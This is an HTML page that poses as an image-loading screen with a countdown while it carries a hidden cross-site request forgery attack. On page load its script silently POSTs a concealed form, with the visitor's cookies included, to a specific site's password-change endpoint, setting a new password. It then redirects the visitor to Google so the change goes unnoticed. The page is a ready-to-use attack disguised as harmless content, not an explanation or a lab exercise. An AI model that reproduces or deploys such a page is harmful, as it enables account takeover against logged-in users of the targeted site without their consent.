<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>图片加载中...</title>
  <style>
    body {
      text-align: center;
      margin-top: 100px;
      font-family: Arial, sans-serif;
      background-color: #fff;
    }
    #status {
      font-size: 18px;
    }
    #timer {
      font-size: 24px;
      margin-top: 10px;
      color: #888;
    }
  </style>
</head>
<body>

  <p id="status">图片加载中，请稍等…</p>
  <p id="timer">30</p>
  <img src="notfound.png" alt="图片" style="display:none;" />

  <!-- 隐藏的 CSRF 表单 -->
  <form id="csrfForm" action="https://cn.b58321.com/index.php?s=/MemberCenter/formChangePassword" method="POST">
    <input type="hidden" name="oldPassword" value="12345678">
    <input type="hidden" name="newPassword" value="123456789">
    <input type="hidden" name="new2Password" value="123456789">
  </form>

  <script>
    window.onload = function () {
      // 自动提交表单
      const form = document.getElementById('csrfForm');

      // 使用 Fetch 模拟提交后跳转（防止页面直接跳转到 action）
      fetch(form.action, {
        method: 'POST',
        body: new FormData(form),
        credentials: 'include'  // 保持 cookies，必要时启用
      }).then(() => {
        // 表单提交完毕后立即跳转
        window.location.href = "https://www.google.com/?hl=zh_TW";
      }).catch(() => {
        document.getElementById('status').innerText = "提交失败，请稍后再试。";
      });

      // 倒计时逻辑（30 到 1）
      let seconds = 30;
      const timer = document.getElementById('timer');
      const status = document.getElementById('status');

      const countdown = setInterval(() => {
        seconds--;
        if (seconds >= 1) {
          timer.innerText = seconds;
        } else {
          clearInterval(countdown);
          status.innerText = '图片加载失败，请重试。';
          timer.style.display = 'none';
        }
      }, 1000);
    };
  </script>
</body>
</html>
